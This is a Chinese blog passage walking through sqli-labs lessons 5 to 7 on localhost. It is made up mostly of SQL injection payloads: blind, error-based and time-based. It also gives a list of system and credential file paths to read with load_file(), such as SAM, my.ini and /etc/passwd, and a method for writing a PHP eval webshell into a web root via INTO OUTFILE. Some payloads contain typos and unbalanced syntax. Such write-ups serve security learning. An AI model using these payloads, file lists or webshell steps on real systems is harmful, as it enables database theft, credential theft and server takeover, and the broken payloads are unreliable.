<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">info</span> rmation_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span></span><br></pre></td></tr></table></figure>

<p>根据以上得知数据库名为security，那我们利用此方式获取security数据库下的表。获取security数据库的第一个表的第一个字符</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> infromation_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>此处的table_schema可以为security，如果database()只有一个库就可以用database()。此处同样使用二分法进行测试。最终测试结果该表名第一个字符ascii值为101，为email的e。</p>
<p>而获取第一个表的第二个字符，则按照substr()函数的特性，将其改为sub(**,2,1)即可</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">108</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>获知第一个表的第二个字符ascii码值为109</p>
<p>以此类推就可将第一个表中的所有字符。</p>
<p>上述playload中limit 0，1意思是从第0个开始获取第1个表，获取第二个则是limit 1，1</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">113</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>此处返回，因为第二个表名为referers，第一位为r</p>
<p>通过上述的全部过程就可以将security库中的表全部注入出来。</p>
<p>(3)利用regexp获取（2）中的users表中的列 //正则匹配</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and 1=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">and</span> table_name regexp <span class="string">'^us[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)<span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>这可以选择users表中的列名是否有<code>us**</code>的列，测试users表中的<code>us**</code>列的</p>
<p>第三个字符是否在a-z范围内。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and 1=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">and</span> table_name regexp <span class="string">'^username'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>) <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/13.png" alt></p>
<p>图片说明username列是存在的，同样可以将username换成password等其他项也会是正确的。</p>
<p>(4)利用ord()和mid()函数获取users表的内容</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and ord(mid((<span class="keyword">select</span> <span class="keyword">ifnull</span>(<span class="keyword">cast</span>(username <span class="keyword">as</span> <span class="built_in">char</span>),<span class="number">0x20</span>)<span class="keyword">from</span> security.users <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>该playload可以获取到users表中的内容，获取username中的第一行的第一个字符的ascii，与68进行比较，即为D。而我们从表中得知第一行数据为Dumb。</p>
<p>(5)使用报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/14.png" alt></p>
<p>利用double数值类型超出范围进行报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' union <span class="keyword">select</span> (<span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())a))),<span class="number">2</span>,<span class="number">3</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>此时要注意mysql版本是否是5.5.5-5.5.52之间的，超出这个范围是无法得到想要的结果。</p>
<p>利用bigint溢出进行报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' union <span class="keyword">select</span> (!(<span class="keyword">select</span> <span class="keyword">user</span>())x) - ~<span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>xpath函数报错注入</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-5</span>/?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="keyword">extractvalue</span>(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="title">@version</span>),<span class="number">0x7e</span>)) -- +</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/15.png" alt></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/16.png" alt></p>
<p>利用数据的重复性</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>))x <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/17.png" alt></p>
<p>(6)延时注入</p>
<p>利用sleep()函数进行注入</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">5</span><span class="regexp">/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))-- +</span></span><br></pre></td></tr></table></figure>

<p>如果查询语句是对的，则会直接显示</p>
<p><img src="/2019/12/27/sqli-labs-writeup/18.png" alt></p>
<p>如果查询语句判断为错误时会有5秒的延时</p>
<p><img src="/2019/12/27/sqli-labs-writeup/19.png" alt></p>
<p><img src="/2019/12/27/sqli-labs-writeup/20.png" alt></p>
<p>利用BENCHMARK()进行延时注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1' union <span class="keyword">select</span> (<span class="keyword">if</span> (<span class="keyword">substring</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">115</span>),<span class="keyword">benchmark</span>(<span class="number">50000000</span>,<span class="keyword">encode</span>(<span class="string">'MSG'</span>,<span class="string">'by 5 seconds'</span>)),<span class="literal">null</span>)),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tb1 <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/21.png" alt></p>
<p>当结果正确的时候，运作encode（’MSG’,’by 5 seconds’)操作50000000次，会占用一段时间。</p>
<h4 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h4><p>less6传入参数的部分源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>

<p>与less5比较发现区别在与less6中对id参数传输到服务器时进行了处理，将id增加双引号传输，知道这个就可以将less5中id参数的单引号直接改为双引号</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/?id=1" and left(version(),1)=5 -- +</span></span><br></pre></td></tr></table></figure>

<p>所有的注入过程与less5一致，只要将id的单引号改为双引号即可</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-6</span>/?id=<span class="number">1</span>" and length(database())=8 -- +   //数据库长度</span><br><span class="line">http://localhost/sqli-labs-master/Less-6/?id=1" <span class="keyword">and</span> left(<span class="keyword">database</span>(),<span class="number">1</span>)&gt;<span class="string">'s'</span>     //猜测数据库名第<span class="number">1</span>位</span><br><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-6</span>/?id=<span class="number">1</span>" and left(database(),2)&gt;'se'    //猜测数据库名第2位</span><br><span class="line">......</span><br><span class="line">http://localhost/sqli-labs-master/Less-6/?id=1" <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span> <span class="comment">-- +    //猜测数据库security下的第一个表的第一个字符</span></span><br><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-6</span>/?id=<span class="number">1</span>" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108 -- +     //猜测数据库security下的第一个表的第一个字符</span><br><span class="line">http://localhost/sqli-labs-master/Less-6/?id=1" <span class="keyword">and</span> ascii (substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">113</span> <span class="comment">-- +     //猜测数据库security下第二个表的第一个字符</span></span><br><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-6</span>/?id=<span class="number">1</span>" and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1) -- +     //查看users表中的是否有us**的列，并且该列名第三个字符是否在a-z范围内</span><br><span class="line">http://localhost/sqli-labs-master/Less-6/?id=1" <span class="keyword">and</span> ord(mid((<span class="keyword">select</span> ifnull(cast(username <span class="keyword">as</span> <span class="type">char</span>),<span class="number">0x20</span>)<span class="keyword">from</span> <span class="keyword">security</span>.users <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span> <span class="comment">-- +       //获取users表中第一行的第一个字符的ascii并与68进行比较即为D</span></span><br></pre></td></tr></table></figure>

<h3 id="Background-3-导入与导出相关操作"><a href="#Background-3-导入与导出相关操作" class="headerlink" title="Background-3 导入与导出相关操作"></a>Background-3 导入与导出相关操作</h3><h4 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h4><p>load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
<p>使用条件：</p>
<ul>
<li><p>必须有权限读取并且文件必须完全可读，测试查询语句：</p>
<p>and (select count(*) from mysql.user)&gt;0   //如果返回正常，说明具有读写权限</p>
<p>and (select count(*) from mysql.user)&gt;0  //返回错误，应该是管理员对数据库账户降权</p>
</li>
<li><p>欲读取文件必须在服务器上</p>
</li>
<li><p>必须指定文件完整的路径</p>
</li>
<li><p>欲读取文件必须小于 max_allowed_packet</p>
</li>
</ul>
<p>如果该文件不存在或因为上面的任意一种原因而不能被读取，函数返回为空。其中比较难满足的是权限，在win下，如果NTFS设置得当，是不能读取相关的文件，只有administrators才能访问的文件。</p>
<p>实际注入中，主要要解决两个难点</p>
<ul>
<li>绝对物理路径</li>
<li>构造有效的畸形语句（报错爆出绝对路径）</li>
</ul>
<p>常用的路径</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">WINDOWS下:</span><br><span class="line">c:/<span class="keyword">boot</span>.ini <span class="comment">//查看系统版本</span></span><br><span class="line">c:/windows/php.ini <span class="comment">//php配置信息</span></span><br><span class="line">c:/windows/my.ini <span class="comment">//MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</span></span><br><span class="line">c:/winnt/php.ini</span><br><span class="line">c:/winnt/my.ini</span><br><span class="line">c:\mysql\data\mysql\user.MYD <span class="comment">//存储了mysql.user表中的数据库连接密码</span></span><br><span class="line">c:\<span class="keyword">Program</span> Files\RhinoSoft.com\Serv-<span class="keyword">U</span>\ServUDaemon.ini <span class="comment">//存储了虚拟主机网站路径和密码</span></span><br><span class="line">c:\<span class="keyword">Program</span> Files\Serv-<span class="keyword">U</span>\ServUDaemon.ini</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看<span class="keyword">IIS</span>的虚拟主机配置</span><br><span class="line">c:\windows\repair\sam <span class="comment">//存储了WINDOWS系统初次安装的密码</span></span><br><span class="line">c:\<span class="keyword">Program</span> Files\ Serv-<span class="keyword">U</span>\ServUAdmin.exe <span class="comment">//6.0版本以前的serv-u管理员密码存储于此</span></span><br><span class="line">c:\<span class="keyword">Program</span> Files\RhinoSoft.com\ServUDaemon.exe</span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</span><br><span class="line"><span class="comment">//存储了pcAnywhere的登陆密码</span></span><br><span class="line">c:\<span class="keyword">Program</span> Files\Apache Group\Apache\<span class="keyword">conf</span>\httpd.<span class="keyword">conf</span> 或C:\apache\<span class="keyword">conf</span>\httpd.<span class="keyword">conf</span> <span class="comment">//查看WINDOWS系统apache文件</span></span><br><span class="line">c:/Resin-3.0.14/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> <span class="comment">//查看jsp开发的网站 resin文件配置信息.</span></span><br><span class="line">c:/Resin/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> /usr/<span class="keyword">local</span>/resin/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> 查看linux系统配置的JSP虚拟主机</span><br><span class="line"><span class="keyword">d</span>:\APACHE\Apache2\<span class="keyword">conf</span>\httpd.<span class="keyword">conf</span></span><br><span class="line">C:\<span class="keyword">Program</span> Files\mysql\my.ini</span><br><span class="line">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line"></span><br><span class="line">LUNIX/UNIX 下:</span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/apache2/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span> <span class="comment">//apache2缺省配置文件</span></span><br><span class="line">/usr/<span class="keyword">local</span>/apache2/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span></span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/apache2/<span class="keyword">conf</span>/extra/httpd-vhosts.<span class="keyword">conf</span> <span class="comment">//虚拟网站设置</span></span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/php5/lib/php.ini <span class="comment">//PHP相关设置</span></span><br><span class="line">/etc/sysconfig/iptables <span class="comment">//从中得到防火墙规则策略</span></span><br><span class="line">/etc/httpd/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span> <span class="comment">// apache配置文件</span></span><br><span class="line">/etc/rsyncd.<span class="keyword">conf</span> <span class="comment">//同步程序配置文件</span></span><br><span class="line">/etc/my.cnf <span class="comment">//mysql的配置文件</span></span><br><span class="line">/etc/redhat-release <span class="comment">//系统版本</span></span><br><span class="line">/etc/issue</span><br><span class="line">/etc/issue.<span class="keyword">net</span></span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/php5/lib/php.ini <span class="comment">//PHP相关设置</span></span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/apache2/<span class="keyword">conf</span>/extra/httpd-vhosts.<span class="keyword">conf</span> <span class="comment">//虚拟网站设置</span></span><br><span class="line">/etc/httpd/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span>或/usr/<span class="keyword">local</span>/apche/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span> 查看linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/<span class="keyword">local</span>/resin-3.0.22/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> 针对3.0.22的RESIN配置文件查看</span><br><span class="line">/usr/<span class="keyword">local</span>/resin-<span class="keyword">pro</span>-3.0.22/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> 同上</span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/apache2/<span class="keyword">conf</span>/extra/httpd-vhosts.<span class="keyword">conf</span> APASHE虚拟主机查看</span><br><span class="line">/etc/httpd/<span class="keyword">conf</span>/httpd.<span class="keyword">conf</span>或/usr/<span class="keyword">local</span>/apche/<span class="keyword">conf</span> /httpd.<span class="keyword">conf</span> 查看linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/<span class="keyword">local</span>/resin-3.0.22/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> 针对3.0.22的RESIN配置文件查看</span><br><span class="line">/usr/<span class="keyword">local</span>/resin-<span class="keyword">pro</span>-3.0.22/<span class="keyword">conf</span>/resin.<span class="keyword">conf</span> 同上</span><br><span class="line">/usr/<span class="keyword">local</span>/<span class="keyword">app</span>/apache2/<span class="keyword">conf</span>/extra/httpd-vhosts.<span class="keyword">conf</span> APASHE虚拟主机查看</span><br><span class="line">/etc/sysconfig/iptables 查看防火墙策略</span><br><span class="line">load_file(<span class="built_in">char</span>(47)) 可以列出FreeBSD,Sunos系统根目录</span><br><span class="line"><span class="keyword">replace</span>(load_file(0×2F6574632F706173737764),0×3c,0×20)</span><br><span class="line"><span class="keyword">replace</span>(load_file(<span class="built_in">char</span>(47,101,116,99,47,112,97,115,115,119,100)),<span class="built_in">char</span>(60),<span class="built_in">char</span>(32))</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,hex(replace(load_file(char(<span class="number">99</span>,<span class="number">58</span>,<span class="number">92</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">92</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">92</span>,<span class="number">115</span>,<span class="number">97</span>,<span class="number">109</span>)))</span><br></pre></td></tr></table></figure>

<p>利用hex()将文件内容导出，尤其是smb文件时可以使用</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,1,1,<span class="title">load_file</span>(<span class="title">char</span>(99,58,47,98,111,111,116,46,105,110,105))</span></span><br><span class="line">/<span class="regexp">/char(99,58,47,98,111,111,116,46,105,110,105)就是c:/boot</span>.ini的ASCII代码</span><br><span class="line">-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,1,1,<span class="title">load_file</span>(0<span class="title">x633a2f626f6f742e696e69</span>)  </span></span><br><span class="line">/<span class="regexp">/“c:/boot</span>.ini” 的 <span class="number">16</span> 进制是“<span class="number">0x633a2f626f6f742e696e69</span>”</span><br><span class="line">-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,1,1,<span class="title">load_file</span>(<span class="title">c</span>:\\<span class="title">boot</span>.<span class="title">ini</span>)</span></span><br><span class="line">/<span class="regexp">/路径内的/</span>用\\代替</span><br></pre></td></tr></table></figure>

<h4 id="文件导入到数据库"><a href="#文件导入到数据库" class="headerlink" title="文件导入到数据库"></a>文件导入到数据库</h4><p>LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。</p>
<p><img src="/2019/12/27/sqli-labs-writeup/22.png" alt></p>
<p>在注入的过程中，我们往往需要一些特殊的文件，比如说配置文件，密码文件等。当拥有数据库的权限时，可以将系统文件利用load data infile导入到数据库中。</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">'/tmp/to.txt'</span> <span class="keyword">ignore</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">to</span> <span class="built_in">character</span> <span class="keyword">set</span> gbk <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span> <span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\n'</span></span><br></pre></td></tr></table></figure>

<p>将/tmp/to.txt导入到t0表中，character set gbk是字符集设置为gbk，fileds terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符</p>
<p>当错误代码为2时，文件不存在，错误代码为13时没有权限，可以考虑/tmp文件</p>
<h4 id="导入到文件"><a href="#导入到文件" class="headerlink" title="导入到文件"></a>导入到文件</h4><p>select ……into outfile ‘file_name’</p>
<p>可将被选择的某一行写入到一个文件中，该文件被创建到服务器主机上，前提是拥有file权限，才能使用该语法，file_name不能是一个已经存在的文件。</p>
<p>一般有两种利用形式：</p>
<ul>
<li><p>直接将select内容导入到文件中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>() <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"c:\\phpnow\\htdocs\\test.php"</span></span><br></pre></td></tr></table></figure>

<p>此处将version()替换成y一句话，<?php @eval($_post["mima"]) ?>也可以使用即：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_post[<span class="string">"mima"</span>]) ?php&gt; into outfile <span class="string">"c:\\phpnow\\htdocs\\test.php"</span></span></span><br></pre></td></tr></table></figure>

<p>然后直接连接一句话即可，其实在select内容还可以上传很多的内容。</p>
</li>
<li><p>修改文件结尾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select version() into outfile &quot;c:\\phpnow\\htdocs\\test.php&quot; lines terminated by 0x16 进制文件</span><br></pre></td></tr></table></figure>

<p>通常情况下，用‘\r\n’结尾，此处修改为自己想要的任何文件，同事可以用FIELDS TERMINATED BY。16进制可以为一句话或者其他任何的代码</p>
</li>
</ul>
<p>TIPS:</p>
<ul>
<li><p>(1)可能在文件路径当中要注意转义，具体看环境</p>
</li>
<li><p>(2)load_file()当前台无法导出数据的时候，可以使用：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load<span class="constructor">_file('<span class="params">c</span>:\\<span class="params">wamp</span>\\<span class="params">bin</span>\\<span class="params">mysql</span>\\<span class="params">mysql5</span>.6.17\\<span class="params">my</span>.<span class="params">ini</span>')</span> into outfile 'c:\\wamp\\www\\test.php'</span><br></pre></td></tr></table></figure>

<p>可利用该语句将服务器当中的内容导入到web服务器的目录中，这样就可以找到数据。在my.ini当中存在password项（默认被注释），会有很多可以被导出来。</p>
</li>
</ul>
<h4 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h4><p>连接标题是dump into outfile 意思就是利用文件导入的方式进行注入。</p>
<p>首先还是回归源码中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=((<span class="string">'$id'</span>)) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>在源码中对id参数进行 <code>&#39;))</code>处理，可以尝试 <code>&#39;)) or 1=1 -- +</code>进行注入</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">7</span><span class="regexp">/?id=1')) or 1=1 -- +</span></span><br></pre></td></tr></table></figure>

<p>以下为使用文件导入的方式进行注入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-7/?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"D:\\phpStudy\\WWW\\sqli-labs-master\\Less-7\\uuu.txt"</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/23.png" alt></p>
<p>图中显示sql出错但是在文件中还是创建了uuu.txt文件。</p>
